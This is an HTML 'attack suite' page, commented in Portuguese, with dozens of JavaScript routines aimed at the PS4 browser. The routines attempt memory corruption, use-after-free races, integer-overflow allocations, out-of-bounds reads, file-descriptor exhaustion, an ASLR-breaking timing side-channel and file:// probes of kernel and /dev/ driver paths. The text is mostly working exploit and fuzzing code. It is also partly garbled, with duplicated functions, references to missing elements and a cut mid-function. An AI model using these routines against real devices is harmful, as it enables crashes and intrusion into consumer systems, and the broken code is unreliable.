<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Attack</title>
   
</head>
<body>

    <h1>ATTACK SUITE</h1>


    <button onclick="runRegexStackSmash()">Regex Stack Exhaustion (error_stack)</button>
    <button onclick="runLocaleOverflow()">Date/Locale Buffer Overflow</button>
    <button onclick="runBadArrayLength()">Bad Array Length (Integer Overflow)</button>
    <button onclick="runFileSystemURI()">Filesystem Error Trigger (Path Norm)</button>
    <button onclick="runPluginFuzzer()">Zombie Plugin Loader (MIME Confusion)</button>
    <button onclick="runGamepadRace()">Gamepad Driver Race (Vibration)</button>
    <button onclick="runErrorPageOverflow()">Internal Error Page Overflow</button>
    <button onclick="runIntlCrash()">Intl.Collator Bad Cast (C++ Exception)</button>
    
    <button onclick="runDataViewOverflow()">DataView Offset Overflow (SceLibc Panic)</button>
    
    <button onclick="runSeaFoodStress()"> 'SeaFood' Allocator Confusion</button>
    <button onclick="runWebRTCRace()"> WebRTC DataChannel UAF (NetworkProcess)</button>
    <button onclick="runStreamLocking()"> ReadableStream Locking Race</button>
    <button onclick="runBroadcastFlood()"> BroadcastChannel IPC Flood</button>
    <button onclick="runWorkerRace()"> Worker Mutex Destruction Race</button>
    <button onclick="runBigIntCrash()"> BigInt 128-bit Math Panic</button>
    <button onclick="runTextEncoderOOB()"> TextEncoder Stream Corruption</button>
    <button onclick="runSortAttack()"> qsort() Comparator Bomb (Memory Corruption)</button>
    <button onclick="runFDExhaustion()"> File Descriptor Storm (OS DoS)</button>
    <button onclick="runBacktraceLeak()"> Stack Trace Address Leak</button>
    <button onclick="runExceptionJump()">Exception Context Corruption (setjmp exploit)</button>
    <button onclick="runTimingAttack()">High-Res Timing Side-Channel (ASLR Break)</button>
    <button onclick="runMmapRace()">ArrayBuffer mmap/munmap Race</button>
    <button onclick="runMonoTrigger()">MonoVM Memory Pool Trigger</button>
    <button onclick="runUnwindBomb()">Exception Unwind Crash (Stack Smash)</button>
    <button onclick="runDevPathProbe()">/dev/ Driver Access Attempt</button>
    <button onclick="runExecCommandUAF()">execCommand DOM Destruction (Editing UAF)</button>
    <button onclick="runMessagePortRace()">MessagePort Transfer Race (IPC UAF)</button>
    <button onclick="runFilterCrash()">CSS Filter Buffer Overflow</button>
    <button onclick="runTreeWalkerUAF()">TreeWalker Node Removal (Logic UAF)</button>
    <button onclick="runCSSHasBomb()">CSS :has() Exponential Explosion</button>
    <button onclick="runSVGCycle()">SVG Shadow DOM Recursion</button>
    <button onclick="runXMLBomb()">XML Billion Laughs (Memory Explosion)</button>
    <button onclick="runCSSVarCycle()">CSS Variable Recursion (Style Hang)</button>
    <button onclick="runSDPMangle()">WebRTC SDP Parser Crash</button>

    <div id="log">Status: Aguardando testes...</div>

    <script>
        function log(msg) { 
            document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
        }

        // --- TESTE 1: Regex Stack Exhaustion ---
        // Ataca especificamente o erro "regex_error(error_stack)" encontrado no binário.
        // Cria grupos de captura aninhados até estourar a pilha do motor C++.
        function runRegexStackSmash() {
            log("Iniciando Regex Stack Attack...");
            setTimeout(() => {
                try {
                    // O limite costuma ser entre 1000 e 5000 em sistemas embarcados
                    const depth = 8000; 
                    let pattern = "a".repeat(depth);
                    let regexStr = "";
                    
                    // Gera padrão: (((((.....)))))
                    for(let i=0; i<depth; i++) regexStr += "(";
                    regexStr += "a";
                    for(let i=0; i<depth; i++) regexStr += ")";
                    
                    log("Compilando Regex de profundidade " + depth + "...");
                    const r = new RegExp(regexStr);
                    
                    log("Executando match...");
                    // Isso força a recursão no motor C++
                    "a".match(r);
                    
                    log("Regex falhou em crashar (Handled).");
                } catch(e) {
                    log("Erro capturado: " + e.message);
                    if (e.message.includes("stack")) {
                        log("SUCESSO PARCIAL: Erro de pilha detectado!");
                    }
                }
            }, 100);
        }

        // --- TESTE 2: Date/Locale Buffer Overflow ---
        // Tenta explodir o buffer de formatação de data (asctime_s/strftime) usando locales gigantes.
        function runLocaleOverflow() {
            log("Iniciando Locale Buffer Overflow...");
            try {
                const hugeString = "en-u-ca-gregory-nu-latn".repeat(1000); // Locale malformado gigante
                
                // Tenta formatar uma data usando esse locale tóxico
                const date = new Date();
                log("Formatando data com locale gigante...");
                
                const formatter = new Intl.DateTimeFormat(hugeString, {
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric',
                    hour: 'numeric',
                    minute: 'numeric',
                    second: 'numeric',
                    timeZoneName: 'long'
                });
                
                const result = formatter.format(date);
                log("Resultado (Safe): " + result.substring(0, 50) + "...");
                
            } catch(e) {
                log("Erro de Locale: " + e.message);
            }
        }

        // --- TESTE 3: Bad Array Length (Integer Overflow) ---
        // Ataca a string "St20bad_array_new_length" encontrada.
        // Tenta alocar arrays com tamanhos que causam overflow em 32-bit (0xFFFFFFFF + 1).
        function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            
            // Valores limítrofes para 32-bit signed/unsigned
            const sizes = [
                0xFFFFFFFF, 
                0x80000000, 
                0x7FFFFFFF,
                -1,
                4294967295, // Max Uint32
                4294967296  // Overflow
            ];

            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    // Se o cálculo de tamanho (size * bytes) der overflow, pode alocar pouco e escrever muito
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {
                    // RangeError é normal. Estamos procurando Crash ou InternalError.
                }
            });
            log("Teste de Array finalizado.");
        }

        // --- TESTE 4: Filesystem Error Trigger ---
        // O binário tem "filesystem_error". Não temos acesso a arquivos, mas...
        // Podemos tentar enganar o navegador para processar URIs de arquivo.
        function runFileSystemURI() {
            log("Testando normalização de caminhos (Path Traversal)...");
            
            const payloads = [
                "file:///system/common/lib/libkernel.sprx", // Tenta carregar o próprio kernel
                "file:///..%2f..%2f..%2f..%2f..%2f..%2f..%2fdev/random",
                "blob:file:///Test",
                "view-source:file:///"
            ];

            payloads.forEach(uri => {
                try {
                    log("Navegando para: " + uri);
                    // Usamos XHR para tentar ler, não apenas navegar
                    const xhr = new XMLHttpRequest();
                    xhr.open("GET", uri);
                    xhr.send();
                } catch(e) {
                    log("Bloqueado: " + e.message);
                }
            });
            
            // Tenta criar um Blob com tipo MIME que force download/parse
            try {
                const b = new Blob(["ELF..."], {type: "application/x-sce-app"});
                const u = URL.createObjectURL(b);
                log("Blob especial criado: " + u);
            } catch(e) {}
        }

function log(msg) { 
            document.getElementById('log').innerText += `> ${msg}\n`; 
        }

        // --- TESTE 1: Plugin Zombie (<embed>) ---
        // Tenta carregar plugins que não existem usando tipos MIME malucos.
        // O objetivo é confundir o "PluginFinder" do WebKit.
        function runPluginFuzzer() {
            log("Iniciando Fuzzing de Plugins...");
            const container = document.getElementById('hidden-area');
            const mimes = [
                "application/x-shockwave-flash", // Clássico (Removido?)
                "application/pdf",               // PDF interno?
                "application/x-java-applet",     // Java legado
                "audio/x-pn-realaudio-plugin",   // RealPlayer
                "application/x-ps4-app",         // Tipo interno Sony?
                "text/x-python",                 // Texto plano disfarçado
                "null/null"                      // Tipo inválido
            ];

            let i = 0;
            const interval = setInterval(() => {
                if (i >= 500) {
                    clearInterval(interval);
                    log("Plugin Fuzzer finalizado.");
                    return;
                }

                try {
                    // Cria e destroi embeds rapidamente
                    const embed = document.createElement('embed');
                    embed.type = mimes[i % mimes.length];
                    embed.width = 100;
                    embed.height = 100;
                    
                    // Tenta passar parâmetros estranhos
                    embed.setAttribute("src", "data:text/plain,A");
                    embed.setAttribute("allowScriptAccess", "always");
                    
                    container.appendChild(embed);
                    
                    // Tenta acessar propriedades do plugin antes de carregar
                    const test = embed.validity; 
                    
                    // Remove rapidamente (Race Condition no carregamento)
                    setTimeout(() => { container.removeChild(embed); }, 10);
                    
                } catch(e) {}
                i++;
            }, 20);
        }

        // --- TESTE 2: Gamepad Driver Race ---
        // ATENÇÃO: Segure o controle na mão. 
        // Vamos tentar mandar comandos de vibração enquanto consultamos o estado.
        function runGamepadRace() {
            log("Iniciando Ataque ao Driver de Controle...");
            log("Pressione botões no controle agora!");

            if (!navigator.getGamepads) {
                log("Gamepad API não suportada.");
                return;
            }

            const interval = setInterval(() => {
                const pads = navigator.getGamepads();
                
                for (let i = 0; i < pads.length; i++) {
                    const gp = pads[i];
                    if (gp && gp.vibrationActuator) {
                        try {
                            // Envia comando de vibração (interage com Hardware)
                            gp.vibrationActuator.playEffect("dual-rumble", {
                                startDelay: 0,
                                duration: 100,
                                weakMagnitude: 1.0,
                                strongMagnitude: 1.0
                            });

                            // Acessa freneticamente os botões enquanto o motor vibra
                            // Tenta causar conflito na thread de I/O do controle
                            const btn = gp.buttons[0].pressed;
                            const axe = gp.axes[0];
                            
                        } catch(e) {}
                    }
                }
            }, 10); // Loop de 10ms (Alta frequência)
            
            setTimeout(() => clearInterval(interval), 10000);
        }

        // --- TESTE 3: Internal Error Page Overflow ---
        // O WebKit tem páginas internas (ex: "Não foi possível conectar").
        // Vamos tentar gerar uma URL de erro tão grande que o renderizador da mensagem de erro crasha.
        function runErrorPageOverflow() {
            log("Gerando URL de Erro Gigante...");
            
            setTimeout(() => {
                // Cria uma URL inválida gigantesca
                // O navegador vai tentar exibir: "Erro ao conectar em https://en.wikipedia.org/wiki/Gigante"
                // Se o buffer da mensagem de erro for fixo, BOOM.
                const giantProtocol = "unsupported-protocol-" + "A".repeat(50000) + ":";
                
                try {
                    window.location.href = giantProtocol;
                } catch(e) {
                    log("Navegador recusou a URL (Seguro).");
                }
                
                // Tentativa secundária: Iframe
                const ifr = document.createElement('iframe');
                ifr.src = giantProtocol;
                document.body.appendChild(ifr);
            }, 1000);
        }

function runIntlCrash() {
            log("Iniciando ataque Intl Type Confusion...");
            try {
                const collator = new Intl.Collator();
                
                // Cria um objeto malicioso que se comporta mal ao ser convertido para String
                const evilObj = {
                    toString: function() {
                        // Na primeira leitura, é normal. Na segunda, retorna algo tóxico.
                        log("C++ solicitou conversão de string...");
                        // Tenta retornar um Symbol ou Object para causar erro de tipo interno
                        return { evil: true }; 
                    }
                };

                // O método compare espera duas strings.
                // Se o motor C++ não tratar a exceção da conversão, CRASH.
                log("Executando collator.compare...");
                collator.compare(evilObj, "test");
                
                log("Intl sobreviveu (Exception Capturada).");
            } catch(e) {
                log("Erro JS: " + e.message);
            }
        }

        // --- TESTE 2: DataView Offset Overflow ---
        // Ataca a string "St12out_of_range" e "bad_array_new_length".
        // Tenta acessar memória fora do buffer usando offsets negativos ou absurdos.
        function runDataViewOverflow() {
            log("Testando DataView Boundary Violation...");
            try {
                const buffer = new ArrayBuffer(16);
                const view = new DataView(buffer);
                
                // Tenta valores que podem ser interpretados como negativos em 32-bit (Inteiro com sinal)
                // 0xFFFFFFFF = -1 em Int32
                const offsets = [0xFFFFFFFF, 2147483648, -1, NaN];
                
                offsets.forEach(off => {
                    try {
                        // Tenta ler memória que não pertence ao Buffer
                        view.getInt8(off);
                    } catch(e) {}
                });

                // O Golpe: Tentar criar um DataView maior que o Buffer (Logic Error)
                // Se o WebKit não checar isso antes de passar pro C++, temos leitura arbitrária
                log("Tentando criar View > Buffer...");
                const badView = new DataView(buffer, 0, 0xFFFFFF); // Tamanho falso
                
                log("Sucesso?! DataView criado com tamanho inválido!");
                const leak = badView.getUint8(100); // Lê memória vizinha
                log("Leitura OOB: " + leak);
                
            } catch(e) {
                log("Bloqueado pelo motor JS: " + e.message);
            }
        }

        // --- TESTE 3: 'SeaFood' Allocator Confusion ---
        // Tenta estressar o alocador "SceLibcSeaFood" mencionado no dump.
        // Esse alocador costuma ser usado para objetos de sistema pequenos (Strings internas, Locales).
        function runSeaFoodStress() {
            log("Iniciando SeaFood Heap Spam...");
            
            setTimeout(() => {
                const trash = [];
                try {
                    // Aloca milhares de strings de formatação de data/locale
                    // Isso força o uso do "SceLibcInternal" em vez do GC do JavaScript
                    for(let i=0; i<5000; i++) {
                        // Usa locale inválido para forçar processamento de erro interno
                        try {
                            const d = new Intl.DateTimeFormat("en-u-ca-islamic-civil-nu-arab");
                            trash.push(d.format(new Date()));
                        } catch(e) {}
                        
                        // Cria URL Objects (também usam alocadores C++)
                        try {
                            const u = new URL("http://test.com/" + "A".repeat(200));
                            trash.push(u.href);
                        } catch(e) {}
                    }
                    
                    log("Buffers internos preenchidos. Tentando Trigger de Erro...");
                    
                    // Agora dispara um erro que precisa ser logado pelo sistema
                    // "regex_error" consome memória para gerar a mensagem de erro
                    const r = new RegExp("(?!" + "a".repeat(1000) + ")");
                    
                } catch(e) {
                    log("Erro Sistema: " + e.message);
                }
            }, 100);
        }

function runWebRTCRace() {
            log("Iniciando WebRTC Lifecycle Attack...");
            
            if (!window.RTCPeerConnection) {
                log("ERRO: WebRTC desativado neste firmware.");
                return;
            }

            try {
                const pc = new RTCPeerConnection();
                // Cria um canal de dados (falso, sem rede real)
                const dc = pc.createDataChannel("fuzz");
                
                dc.onopen = () => log("Canal aberto (Inesperado)");
                dc.onerror = (e) => log("Erro no canal (Normal)");

                // O GOLPE: Fechar o PC imediatamente e tentar enviar dados massivos
                // Tenta ganhar a corrida contra a thread de limpeza do WebRTC
                log("Fechando PeerConnection...");
                pc.close();

                // Spray de dados no canal "morto"
                const payload = "A".repeat(1024 * 1024); // 1MB
                
                // Tenta forçar o envio em um loop apertado
                for(let i=0; i<50; i++) {
                    try {
                        dc.send(payload); // Isso deve falhar, mas se crashar é UAF
                    } catch(e) {
                        // Ignora erros de "InvalidStateError" (o esperado)
                        // Estamos procurando o que NÃO lança erro (o crash)
                    }
                }
                log("WebRTC: Sobreviveu ao uso pós-fechamento.");

            } catch(e) {
                log("Erro WebRTC: " + e.message);
            }
        }

        // --- TESTE 2: ReadableStream Locking Race ---
        // A API de Streams usa "Readers" que bloqueiam o stream.
        // Vamos tentar liberar o bloqueio e ler ao mesmo tempo.
        function runStreamLocking() {
            log("Iniciando Stream Locking Race...");
            
            try {
                // Cria um stream infinito
                const stream = new ReadableStream({
                    start(controller) {
                        // Enche o buffer
                        for(let i=0; i<100; i++) controller.enqueue("chunk");
                    }
                });

                const reader1 = stream.getReader();
                
                // Lê um pedaço
                reader1.read().then(() => {
                    log("Leitura 1 completa. Tentando Race...");
                    
                    // O GOLPE: Liberar o lock e tentar pegar outro reader IMEDIATAMENTE
                    // em uma promessa concorrente
                    reader1.releaseLock();
                    
                    try {
                        const reader2 = stream.getReader();
                        // Se o estado interno do WebKit não atualizou atomicamente,
                        // podemos ter dois readers ou um estado corrompido.
                        reader2.read(); 
                        reader2.releaseLock();
                    } catch(e) {}
                });
                
                log("Stream: Ciclo de bloqueio executado.");

            } catch(e) {
                log("Erro Stream: " + e.message);
            }
        }

        // --- TESTE 3: BroadcastChannel IPC Flood ---
        // BroadcastChannel envia mensagens para outras abas/janelas.
        // Mesmo com uma aba só, o processo de rede (NetworkProcess) precisa serializar isso.
        // Vamos enviar objetos complexos para tentar estourar o buffer de IPC.
        function runBroadcastFlood() {
            log("Iniciando BroadcastChannel IPC Flood...");
            
            if (!window.BroadcastChannel) {
                log("BroadcastChannel não suportado.");
                return;
            }

            const bc = new BroadcastChannel('internal_fuzz');
            
            // Cria um objeto profundamente aninhado para estressar o serializador IPC
            let deepObj = {a: 1};
            for(let i=0; i<500; i++) {
                deepObj = { next: deepObj, padding: "A".repeat(100) };
            }

            log("Enviando bombas de objetos...");
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    bc.postMessage(deepObj);
                    count++;
                    
                    if(count % 100 === 0) log(`Enviadas: ${count}`);
                    
                    if(count > 2000) {
                        clearInterval(interval);
                        bc.close();
                        log("IPC Flood finalizado.");
                    }
                } catch(e) {
                    log("Erro IPC: " + e.message);
                    clearInterval(interval);
                }
            }, 5);
        }

function runWorkerRace() {
            log("Iniciando Worker Termination Race...");
            
            const workerCode = `
                setInterval(() => {
                    // Spama o console para forçar o uso de Mutex interno de I/O
                    console.log("LOCK " + Math.random());
                    // Tenta usar APIs que alocam memória do sistema
                    new Date().toLocaleString();
                }, 1);
            `;
            
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                const w = new Worker(url);
                
                // Deixa o worker rodar por um tempo aleatório minúsculo
                // O objetivo é matar a thread ENQUANTO ela segura um lock
                const killTime = Math.random() * 10; 
                
                setTimeout(() => {
                    w.terminate();
                }, killTime);

                if(count % 50 === 0) log(`Workers criados/mortos: ${count}`);
                
                if(count > 500) {
                    clearInterval(interval);
                    log("Teste de Thread finalizado.");
                }
            }, 20);
        }

        // --- TESTE 2: BigInt 128-bit Math Panic ---
        // Ataca as funções __mulvti3 / __divti3 do libSceLibcInternal.
        // Operações matemáticas que forçam o uso de registros de 128 bits via software.
        function runBigIntCrash() {
            log("Estressando implementação BigInt (Software Math)...");
            
            try {
                // Cria números maiores que 64 bits (força __int128 no C++)
                let a = 1n;
                let b = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFn; // 128-bit max
                
                // Operações pesadas
                setTimeout(() => {
                    try {
                        for(let i=0; i<10000; i++) {
                            // Exponenciação e Multiplicação agressiva
                            a = a * 123456n;
                            b = b + a;
                            
                            // Tenta operação bitwise em números gigantes
                            // Isso pode bugar se a implementação interna tiver buffer overflow
                            let c = a ^ b;
                            let d = c >> 64n; 
                        }
                        log("Math Loop concluído (Sem Crash).");
                        log("Valor final (Check): " + a.toString().substring(0, 20) + "...");
                    } catch(e) {
                        log("Erro Matemático: " + e.message);
                    }
                }, 100);
                
            } catch(e) { log("BigInt não suportado."); }
        }

        // --- TESTE 3: TextEncoder Stream Corruption ---
        // Ataca a string "invalid string position" e "codecvt" do libc.
        // Usa o modo {stream: true} para deixar o conversor C++ em estado pendente ("surrogate pair" quebrado).
        function runTextEncoderOOB() {
            log("Iniciando TextEncoder Stream State Fuzzing...");
            
            const encoder = new TextEncoder();
            const decoder = new TextDecoder("utf-8", {fatal: true});
            
            try {
                // 1. Cria um buffer com sequências UTF-8 inválidas/cortadas
                const badChunk = new Uint8Array([0xF0, 0x9F]); // Início de um Emoji (4 bytes), mas incompleto
                
                // 2. Tenta decodificar repetidamente em modo stream
                // Isso força o C++ a guardar o estado "pendente" no heap interno
                for(let i=0; i<1000; i++) {
                    try {
                        decoder.decode(badChunk, {stream: true});
                    } catch(e) {}
                }
                
                // 3. O GOLPE: Envia um chunk gigante válido para forçar a realocação do buffer interno
                // enquanto ele ainda espera o resto do Emoji
                const bomb = new Uint8Array(1024*1024).fill(0x41); // 1MB 'A'
                log("Enviando Payload de 1MB no estado sujo...");
                decoder.decode(bomb);
                
                log("Decoder sobreviveu.");
                
            } catch(e) {
                log("Erro Decoder (Seguro): " + e.message);
            }
        }
function runSortAttack() {
            log("Iniciando Ataque de Ordenação (JIT/C++ Boundary)...");
            
            try {
                // Cria um array com tipos mistos para confundir a otimização
                // Tamanho suficiente para forçar o uso de algoritmo rápido (QuickSort)
                const arr = new Array(10000).fill(0).map((_, i) => i);
                
                // Array auxiliar para causar pressão de memória
                const hole = [];

                log("Executando sort() malicioso...");
                
                arr.sort((a, b) => {
                    // O GOLPE:
                    // Na metade da ordenação, destruímos o array original.
                    // O código C++ ainda tem ponteiros para os elementos antigos.
                    if (a === 5000) {
                        log("Gatilho ativado! Redimensionando array...");
                        arr.length = 0; // Esvazia o array
                        
                        // Tenta preencher o espaço liberado com lixo
                        for(let i=0; i<1000; i++) hole.push(new Float64Array(100));
                        
                        // Retorna valor inválido para confundir o algoritmo de partição
                        return NaN;
                    }
                    return a - b;
                });
                
                log("Sort finalizado (Seguro - Array length: " + arr.length + ")");
                
            } catch(e) {
                log("Erro Crítico no Sort: " + e.message);
            }
        }

        // --- TESTE 2: File Descriptor Exhaustion ---
        // Ataca o limite "Too many open files" encontrado no libSceLibcInternal.
        // Tenta abrir milhares de conexões simultâneas para esgotar a tabela de arquivos do processo.
        function runFDExhaustion() {
            log("Iniciando Tempestade de File Descriptors (FDs)...");
            
            const connections = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Tenta abrir 50 requisições por ciclo
                for(let i=0; i<50; i++) {
                    try {
                        // fetch() usa sockets, que consomem FDs no Kernel FreeBSD
                        // Usamos 'keep-alive' para manter o FD aberto
                        const p = fetch("/", {keepalive: true}).catch(e => {});
                        connections.push(p);
                        count++;
                    } catch(e) {
                        log("Falha ao abrir socket: " + e.message);
                        // Se der erro aqui, atingimos o limite do SO!
                        clearInterval(interval);
                        log("LIMITE ATINGIDO: " + count + " FDs abertos.");
                        log("Verifique se o sistema está instável (ícones sumindo, áudio falhando).");
                        return;
                    }
                }
                
                if (count % 500 === 0) log(`Sockets abertos: ${count}`);
                
                // Limite de segurança para não travar tudo para sempre
                if (count > 15000) clearInterval(interval);
                
            }, 10);
        }

        // --- TESTE 3: Stack Trace Address Leak ---
        // Tenta extrair informações de memória usando a string de formatação "Backtrace : 0x%016p".
        // Força uma cadeia de erros profunda para ver se o engine vaza ponteiros internos.
        function runBacktraceLeak() {
            log("Tentando forçar vazamento de Backtrace...");
            
            function recurse(depth) {
                if (depth === 0) {
                    // Lança erro proposital no fundo da pilha
                    throw new Error("DeepStackError");
                }
                recurse(depth - 1);
            }

            try {
                // Profundidade calculada para ser grande, mas não estourar a pilha imediatamente
                recurse(1000);
            } catch(e) {
                log("Erro capturado. Analisando Stack Trace...");
                
                // Verifica se o stack trace contém endereços de memória hexadecimais (0x...)
                // Navegadores seguros mostram apenas linhas/colunas. 
                // Versões de debug ou mal configuradas mostram ponteiros.
                if (e.stack && (e.stack.includes("0x") || e.stack.match(/\[.*0x.*\]/))) {
                    log("ALERTA DE SEGURANÇA: Endereços de memória encontrados na stack!");
                    log(e.stack.substring(0, 200) + "...");
                } else {
                    log("Stack limpa (Sem endereços expostos).");
                }
                
                // Tenta acessar propriedades internas não padronizadas
                if (e.lineNumber || e.columnNumber || e.sourceURL) {
                    log("Metadados extras disponíveis: " + e.sourceURL);
                }
            }
        }
 function runExceptionJump() {
            log("Iniciando Ataque de Corrupção de Contexto...");
            
            let pressure = [];
            
            function deepTry(depth) {
                try {
                    if (depth > 0) {
                        // Aloca lixo na stack a cada nível
                        let junk = new Float64Array(100); 
                        deepTry(depth - 1);
                    } else {
                        // No fundo da recursão, estressa o Heap para forçar movimento de memória
                        log("Fundo da pilha atingido. Alocando...");
                        for(let i=0; i<5000; i++) pressure.push(new Uint8Array(1024));
                        throw "BOOM"; // Dispara o longjmp
                    }
                } catch (e) {
                    // O catch deve restaurar o contexto. 
                    // Se a memória foi movida ou corrompida durante o 'throw', crash aqui.
                    if (depth % 1000 === 0) log("Catch capturado no nível " + depth);
                    
                    // Tenta confundir o tratador re-lançando erro diferente
                    if (depth === 500) throw 123; 
                }
            }

            try {
                deepTry(4000); // Profundidade alta para estressar o buffer de jmp_buf
                log("Teste de Exceção: Sobreviveu.");
            } catch(e) {
                log("Erro fatal capturado: " + e);
            }
        }

        // --- TESTE 2: High-Res Timing Side-Channel ---
        // Usa performance.now() para medir o tempo de acesso a diferentes tipos de memória.
        // Diferenças de tempo podem revelar onde o Kernel mapeou bibliotecas (quebrando ASLR).
        function runTimingAttack() {
            log("Iniciando Análise de Timing (Side-Channel)...");
            
            const t0 = performance.now();
            const arr = new Uint8Array(1024 * 1024);
            
            // Aquece o cache
            for(let i=0; i<100; i++) arr[i] = i;

            const times = [];
            
            // Mede acesso a memória recém-alocada (fria) vs. cache (quente)
            for(let i=0; i<1000; i++) {
                const start = performance.now();
                // Acesso aleatório para evitar pre-fetch
                const val = arr[Math.floor(Math.random() * arr.length)];
                const end = performance.now();
                times.push(end - start);
            }
            
            // Calcula média e variância
            const avg = times.reduce((a,b) => a+b) / times.length;
            log("Tempo médio de acesso: " + avg.toFixed(5) + "ms");
            
            if (avg > 0.1) {
                log("ALERTA: Timing lento detectado. Possível interferência de Debug ou Swap.");
            } else {
                log("Timing consistente. Difícil extrair dados via side-channel puro.");
            }
        }

        // --- TESTE 3: ArrayBuffer mmap/munmap Race ---
        // Usa a API 'transfer' (postMessage) para mover memória entre threads.
        // Tenta acessar o buffer na thread original APÓS ele ter sido transferido (Neutered).
        // Se falhar, é UAF.
        function runMmapRace() {
            log("Iniciando Transferable Object Race...");
            
            const buffer = new ArrayBuffer(1024 * 1024 * 10); // 10MB
            const view = new Uint8Array(buffer);
            view[0] = 1; // Marcador
            
            const workerCode = `
                onmessage = function(e) {
                    // Recebe a memória e tenta escrever nela imediatamente
                    const view = new Uint8Array(e.data);
                    view[0] = 2;
                    postMessage("done");
                };
            `;
            
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            const worker = new Worker(url);
            
            log("Transferindo buffer para Worker...");
            
            // O GOLPE: Tenta ler o buffer 'neutered' (esvaziado) no milissegundo exato da transferência
            // Em implementações seguras, 'buffer.byteLength' vira 0 imediatamente.
            // Em implementações com bug, pode haver uma janela de milissegundos onde ainda aponta para a memória.
            
            try {
                worker.postMessage(buffer, [buffer]); // Transfere propriedade
                
                // Tenta acesso ilegal pós-transferência
                if (buffer.byteLength > 0) {
                    log("CRÍTICO: Buffer ainda acessível após transferência! (Race Vencida)");
                    log("Valor lido: " + view[0]);
                } else {
                    log("Buffer neutralizado corretamente (byteLength = 0).");
                    
                    // Tenta acesso forçado via view antiga (pode crashar se o pointer não foi limpo)
                    // view[0] = 0xFF; // Descomente para testar crash agressivo (pode matar a aba)
                }
            } catch(e) {
                log("Erro de transferência: " + e.message);
            }
        }
function runMonoTrigger() {
            log("Iniciando sondagem do MonoVM...");
            const container = document.getElementById('hidden-area');
            
            // Tipos que podem forçar a inicialização do runtime Mono
            const mimes = [
                "application/vnd.unity", 
                "application/x-unity",
                "application/unity-web-player"
            ];

            mimes.forEach(mime => {
                try {
                    log(`Testando injeção: ${mime}`);
                    const obj = document.createElement('object');
                    obj.type = mime;
                    obj.width = 10;
                    obj.height = 10;
                    
                    // Parâmetros tóxicos para tentar crashar o inicializador
                    const param = document.createElement('param');
                    param.name = "disableContextMenu";
                    param.value = "true";
                    obj.appendChild(param);
                    
                    container.appendChild(obj);
                    
                    // Força layout e remoção rápida (Race Condition na inicialização)
                    const x = obj.clientLeft;
                    setTimeout(() => container.removeChild(obj), 50);
                    
                } catch(e) {
                    log("Erro: " + e.message);
                }
            });
            log("Injeção concluída. Verifique se o sistema ficou lento.");
        }

        // --- TESTE 2: Exception Unwind Bomb ---
        // Ataca as funções "_Unwind_*" do libkernel.
        // Cria uma pilha de chamadas mista (JS -> C++ -> JS) e lança exceções através dela.
        function runUnwindBomb() {
            log("Iniciando Stack Unwind Stress...");
            
            // Usa métodos nativos que aceitam callbacks (forEach, sort) para misturar a pilha
            // JS chama C++ (Array.forEach) que chama JS (callback) que chama C++...
            
            const arr = new Array(100).fill(0);
            let depth = 0;

            function riskyCallback() {
                depth++;
                if (depth < 500) {
                    // Recursão mista
                    try {
                        arr.forEach(riskyCallback);
                    } catch(e) {
                        // O C++ precisa "desbobinar" (unwind) a pilha aqui.
                        // Se o estado interno estiver corrompido, crasha.
                        if (depth % 50 === 0) log(`Unwinding nível ${depth}...`);
                        throw e; // Re-lança para estressar mais
                    }
                } else {
                    // O Gatilho
                    throw new Error("UNWIND_NOW"); 
                }
            }

            try {
                riskyCallback();
            } catch(e) {
                log("Unwind completado com segurança.");
            }
        }

        // --- TESTE 3: /dev/ Driver Access ---
        // Tenta acessar os caminhos de hardware encontrados no dump (/dev/icc_nvs, etc).
        // Navegadores bloqueiam file://, mas às vezes permitem blobs ou uploads apontando para links simbólicos.
        function runDevPathProbe() {
            log("Sondando Drivers de Hardware (/dev/)...");
            
            // Lista extraída do seu dump do libkernel
            const targets = [
                "/dev/icc_nvs",       // Armazenamento não volátil (Segurança)
                "/dev/srtc",          // Relógio seguro
                "/dev/dmem0",         // Memória direta (Direct Memory)
                "/dev/dipsw",         // Dip Switches (Configuração de Debug)
                "/dev/random"         // Gerador de entropia
            ];

            targets.forEach(path => {
                try {
                    // Tenta criar um File object "falso" apontando para o caminho
                    // Em algumas versões antigas do WebKit, isso causava leitura do kernel
                    // ao tentar calcular o tamanho do arquivo.
                    log("Tentando tocar em: " + path);
                    
                    // Método 1: XHR (Geralmente bloqueado, mas vale testar por erros de sistema)
                    const xhr = new XMLHttpRequest();
                    xhr.open("GET", "file://" + path);
                    xhr.send();
                    
                } catch(e) {
                    // Monitora mensagens de erro específicas de sistema
                    if (e.message.includes("Access denied") || e.message.includes("Network")) {
                        // Normal
                    } else {
                        log(`ALERTA: Resposta estranha para ${path}: ${e.message}`);
                    }
                }
            });
            
            // Método 2: Navegação direta (Pode travar a aba se o driver bloquear)
            try {
                const ifr = document.createElement('iframe');
                ifr.src = "file:///dev/null"; // Teste inócuo primeiro
                document.body.appendChild(ifr);
                setTimeout(() => document.body.removeChild(ifr), 1000);
            } catch(e) {}
        }
function runExecCommandUAF() {
            log("Iniciando ataque ao WebCore::Editing...");
            const editor = document.getElementById('editor');
            editor.focus();
            
            // Seleciona todo o texto
            document.execCommand('selectAll');
            
            try {
                // O GOLPE: Evento DOMNodeRemoved durante a formatação
                editor.addEventListener('DOMNodeRemoved', function handler() {
                    editor.removeEventListener('DOMNodeRemoved', handler);
                    log("Nó sendo removido durante edição! Tentando corromper...");
                    
                    // Tenta limpar o editor enquanto o C++ ainda está processando o comando anterior
                    editor.innerHTML = ""; 
                    
                    // Cria elementos lixo para ocupar a memória liberada
                    let trash = document.createElement('div');
                    trash.setAttribute('a', 'A'.repeat(1000));
                });

                // Executa comando complexo que dispara mutações no DOM
                // 'InsertHTML' é famoso por bugs
                document.execCommand('InsertHTML', false, '<b id="target">PAYLOAD</b>');
                
